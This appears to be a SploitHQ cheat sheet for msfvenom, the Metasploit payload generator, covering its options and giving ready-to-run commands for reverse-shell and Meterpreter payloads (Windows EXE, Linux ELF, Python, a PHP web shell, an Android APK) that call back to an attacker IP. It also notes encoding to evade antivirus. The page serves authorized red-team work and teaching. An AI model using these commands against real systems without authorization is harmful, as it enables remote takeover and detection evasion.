# msfvenom – Payload Generator from Metasploit

**msfvenom** is a standalone payload generation utility bundled with the **Metasploit Framework**. It combines `msfpayload` and `msfencode` into one tool to generate payloads in various formats and optionally encode them to evade detection.

🔗 [Use the Payload Generator on SploitHQ](https://sploithq.com/payload-generator)

---

## 🔍 What Is msfvenom?

- Generates shellcode and executable payloads
- Supports Windows, Linux, macOS, Android, and more
- Output formats include EXE, ELF, APK, Bash, Python, PowerShell, etc.
- Can encode payloads to evade antivirus detection
- Useful for creating stagers, reverse shells, and bind shells

---

## ⚙️ Basic Syntax

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output_file>
```

---

## 🧰 Common Options

| Option              | Description                                            |
|---------------------|--------------------------------------------------------|
| `-p <payload>`       | Specify the payload to use                            |
| `-f <format>`        | Output format (exe, elf, raw, c, python, etc.)        |
| `-o <file>`          | Output file                                            |
| `LHOST=<ip>`         | Local host (attacker IP)                              |
| `LPORT=<port>`       | Listening port on the attacker's machine              |
| `-e <encoder>`       | Use encoder (e.g. x86/shikata_ga_nai)                |
| `-b <badchars>`      | Avoid specified characters (e.g., `\x00`)             |
| `-a <arch>`          | Architecture (e.g., x86, x64)                         |
| `--platform <os>`    | Target platform (windows, linux, etc.)               |
| `--list payloads`    | List all available payloads                           |
| `--list encoders`    | List all encoders                                     |

---

## 🧪 Example Commands

### Windows reverse TCP shell (EXE)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
```

### Linux x64 reverse shell (ELF)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=9001 -f elf -o shell.elf
```

### Python reverse shell
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.1 LPORT=4444 -f raw
```

### PHP web shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php
```

### Android Meterpreter APK
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 R > evil.apk
```

---

## ⚠️ Tips and Warnings

- Many payloads require a handler to be running (via `msfconsole`)
- Encoding may help evade basic antivirus, but is not foolproof
- Always test payloads in a safe and authorized environment

---

## 🌐 SploitHQ Payload Generator

👉 [Build Custom Payloads with a Form](https://sploithq.com/payload-generator)

- Choose payload type and format
- Set LHOST, LPORT, encoder, badchars
- Instantly get your msfvenom command

---

## 🔗 Useful Links

- [Metasploit Payloads Documentation](https://docs.rapid7.com/metasploit/payloads/)
- [Metasploit GitHub](https://github.com/rapid7/metasploit-framework)
- [SploitHQ Payload Generator](https://sploithq.com/payload-generator)

---

## 📄 License

Metasploit and msfvenom are developed and maintained by Rapid7.  
This documentation is maintained by [SploitHQ](https://sploithq.com) for legal red team and educational use only.
